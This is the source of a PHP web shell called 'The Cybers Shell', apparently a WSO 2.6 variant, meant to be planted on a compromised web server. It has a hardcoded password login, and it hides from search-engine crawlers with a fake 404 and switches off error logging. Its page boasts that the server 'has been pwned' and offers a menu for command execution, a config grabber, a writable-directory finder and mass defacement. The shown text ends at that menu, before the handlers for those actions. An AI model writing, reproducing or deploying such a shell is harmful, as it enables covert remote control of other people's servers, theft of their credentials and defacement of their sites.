<?php
// Configuração
$owner        = "JonatasFil";                                                       // Insert your nick
$version      = "1.0";                                                              // The version    
$auth_pass = "88999102282dc68709441867ebc4492e";                                    // md5:thecybers
////////////////////////////////////////////////////////////////////
if(!empty($_SERVER['HTTP_USER_AGENT'])) { 
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); 
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { 
        header('HTTP/1.0 404 Not Found'); 
        exit; 
    } 
} 
  
@session_start(); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('WSO_VERSION', '2.6'); 
  
if(get_magic_quotes_gpc()) { 
    function WSOstripslashes($array) { 
        return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array); 
    } 
    $_POST = WSOstripslashes($_POST); 
} 
  

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else
        wsoLogin(); 

function wsoLogin() { 
    die("  
 <center>
  <title>TheCybers Shell</title>
   <style>
		table{
			width:100%;
		}
		tr{
			background-color:red;
		}
		body, h1 a{
			background-color:black;
			color:#05ff05;
			text-decoration: none;
		}
		th,td{
			background-color:#111;
			text-align: left;
			width:200px;
		}
		form{
			background-color:#111;
			width:100%;
			padding:5px;
			margin-top:10px;
			margin-bottom:10px;
		}
		a{
			color:red;
		}
   </style>
	<div id='login'>
		<form method='post'>
			<h2>The Cybers Shell</h2>
			<img src='http://i.imgur.com/50bOEFV.png'>
            <br>
			<label>Senha:</label><br/>
          <input type=password name=pass> 
		</form>	
	</div>
    </center>"); 
} 
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="icon" href="http://static1.squarespace.com/static/53c6ab6ae4b04d74ae28fc4b/t/53d95f45e4b042be0d26c9d0/1406754677505/TCG+Favicon.png" type="image/x-icon"/>
	<title>The Cybers Shell</title>
	<style>
		table{
			width:100%;
		}
		tr{
			background-color:red;
		}
		body, h1 a{
			background-color:black;
			color:#05ff05;
			text-decoration: none;
		}
		th,td{
			background-color:#111;
			text-align: left;
			width:200px;
		}
		form{
			background-color:#111;
			width:100%;
			padding:5px;
			margin-top:10px;
			margin-bottom:10px;
		}
		a{
			color:red;
		}
		.logo{
			margin:0 auto;
			width:950px;
			height:100px;
			background-image: url('data:image/png;base64,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');
		}
	</style>
</head>
<body>
<center><p>
<pre><font color=white><font color=grey size=8>The Cybers Shell</font><font color=darkred size=4> BETA</font></pre><p></center>
<center>
<pre><font color="#cccccc" size="1"></font><font size="1"><font> ~ by Offset and JonatasFil</font></pre>
</center>
<b><u><center><?php echo "This server has been pwned by $owner"; ?></center></u></b>
</div><p>

<center>
<div id="menu" class="font-effect-fire-animation" color=darkred size=4; align="center">
<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">&nbsp;Home&nbsp;</a>
<a href="?action=cmd">&nbsp;Command Execution&nbsp;</a>
<a href="?action=iplookdom">&nbsp;Ip Reverse&nbsp;</a>
<a href="?action=cari">&nbsp;Find Directory Writable/Readable&nbsp;</a>
<a href="?action=vgrab">&nbsp;Config Grabber&nbsp;</a><br><br>
<a href="?action=mass">&nbsp;Mass Deface Dirs&nbsp;</a><br><br>
